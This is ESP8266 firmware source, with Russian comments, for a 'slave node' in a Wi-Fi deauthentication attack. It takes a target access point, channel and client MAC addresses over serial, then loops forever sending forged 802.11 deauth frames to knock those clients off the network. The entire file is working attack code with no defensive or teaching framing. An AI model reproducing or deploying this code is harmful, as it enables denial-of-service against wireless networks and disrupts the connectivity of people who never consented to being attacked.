#include <ESP8266WiFi.h>
#include <vector>

// Глобальные переменные
String receivedData = "";
String mac = "";
int channel = 0;
std::vector<String> clients;  // Список MAC-адресов клиентов

// Функция для преобразования строки MAC-адреса в массив байтов
bool stringToMac(String macStr, uint8_t* macArray) {
    macStr.trim();  // Удаляем пробелы, \r и \n

    if (macStr.length() != 17) {
        Serial.printf("Invalid MAC length: %s\n", macStr.c_str());
        return false;
    }

    int values[6];
    if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) == 6) {
        for (int i = 0; i < 6; i++) {
            macArray[i] = (uint8_t)values[i];
        }
        Serial.printf("MAC successfully parsed: %s\n", macStr.c_str());
        return true;
    } else {
        Serial.printf("Invalid MAC format: %s\n", macStr.c_str());
        return false;
    }
}

// Функция для отправки пакетов деаутентификации
void sendDeauthPackets(uint8_t *clientMAC, uint8_t *bssid, int channel) {
    uint8_t deauthPacket[26] = {
        0xC0, 0x00, // Frame Control: Deauth
        0x00, 0x00, // Duration
        0, 0, 0, 0, 0, 0, // Destination MAC (Client)
        0, 0, 0, 0, 0, 0, // Source MAC (BSSID)
        0, 0, 0, 0, 0, 0, // BSSID
        0x00, 0x00, // Sequence number
        0x07, 0x00  // Reason code (7: Class 3 frame received from nonassociated STA)
    };

    memcpy(&deauthPacket[4], clientMAC, 6);  // MAC клиента
    memcpy(&deauthPacket[10], bssid, 6);     // MAC точки доступа (source)
    memcpy(&deauthPacket[16], bssid, 6);     // MAC точки доступа (BSSID)

    wifi_set_channel(channel); // Устанавливаем канал перед отправкой пакетов

    wifi_promiscuous_enable(1);
    wifi_set_promiscuous_rx_cb(nullptr);

    int result = wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    
    if (result == 0) {
        Serial.printf("Deauth packet sent to: %02X:%02X:%02X:%02X:%02X:%02X\n",
                      clientMAC[0], clientMAC[1], clientMAC[2],
                      clientMAC[3], clientMAC[4], clientMAC[5]);
    } else {
        Serial.println("Error sending deauth packet! Error code: " + String(result));
    }

    wifi_promiscuous_enable(0);
}

// Функция для деаутентификации клиентов
void deauthClients(uint8_t *bssid, int channel) {
    if (clients.size() == 0) {
        Serial.println("No clients found. Attack aborted.");
        return;
    }

    Serial.println("Starting Deauth Attack...");

    uint8_t clientMAC[6];
    int clientIndex = 0;

    while (true) {  // Бесконечный цикл
        if (clientIndex >= clients.size()) {
            clientIndex = 0;  // Сбрасываем индекс, чтобы начать с первого клиента
        }

        if (stringToMac(clients[clientIndex], clientMAC)) {
            sendDeauthPackets(clientMAC, bssid, channel); // Отправляем пакет деаутентификации
            Serial.printf("Packet sent to client %d: %s\n", clientIndex + 1, clients[clientIndex].c_str());
        } else {
            Serial.printf("Invalid MAC format: %s, skipping...\n", clients[clientIndex].c_str());
        }

        clientIndex++;  // Переходим к следующему клиенту
        delay(350);   // Задержка 1 секунда
    }
}

// Парсинг входящих данных
void parseReceivedData(String data) {
    Serial.println("Parsing received data: " + data);

    clients.clear();  // Очищаем список клиентов

    int bssidIndex = data.indexOf("BSSID:");
    int channelIndex = data.indexOf(",Channel:");
    int clientsIndex = data.indexOf(",Clients:");

    if (bssidIndex == -1 || channelIndex == -1 || clientsIndex == -1) {
        Serial.println("Invalid data format received!");
        return;
    }

    // Извлекаем MAC-адрес
    mac = data.substring(bssidIndex + 6, channelIndex);
    Serial.println("Parsed MAC: " + mac);

    // Извлекаем канал
    String channelStr = data.substring(channelIndex + 9, clientsIndex);
    channel = channelStr.toInt();
    Serial.print("Parsed Channel: ");
    Serial.println(channel);

    // Извлекаем список клиентов
    String clientsStr = data.substring(clientsIndex + 9);
    int start = 0;
    int end = clientsStr.indexOf(";");

    while (end != -1) {
        clients.push_back(clientsStr.substring(start, end));
        start = end + 1;
        end = clientsStr.indexOf(";", start);
    }

    if (start < clientsStr.length()) {
        clients.push_back(clientsStr.substring(start));
    }

    // Выводим список клиентов
    Serial.println("Parsed Clients:");
    for (const auto& client : clients) {
        Serial.println(client);
    }

    // Преобразуем MAC точки доступа в массив байтов
    uint8_t bssid[6];
    if (stringToMac(mac, bssid)) {
        // Запускаем деаутентификацию
        deauthClients(bssid, channel);
    } else {
        Serial.println("Invalid BSSID format!");
    }
}

void setup() {
    Serial.begin(115200);  // Инициализация Serial для отладки

    WiFi.persistent(false); // Отключает сохранение настроек Wi-Fi
    WiFi.disconnect(true);  // Полный сброс соединения
    WiFi.mode(WIFI_OFF);    // Выключает Wi-Fi

    delay(500);

    WiFi.mode(WIFI_STA); // Обязательно ставим режим STA
    wifi_set_opmode(STATION_MODE); // Устанавливаем режим станции
    wifi_promiscuous_enable(1); // Включаем режим мониторинга
    wifi_set_promiscuous_rx_cb(nullptr); // Отключаем callback, если не нужен

    Serial.println("\nSlave Node Ready. Waiting for data from Master...");
}

void loop() {
    while (Serial.available()) {  // Читаем данные с Serial
        char incomingChar = Serial.read();
        
        if (incomingChar == '\n') {  
            if (receivedData.length() > 0) {  
                parseReceivedData(receivedData);
                receivedData = "";  // Сбрасываем буфер
            }
        } else {
            receivedData += incomingChar;
        }
    }
}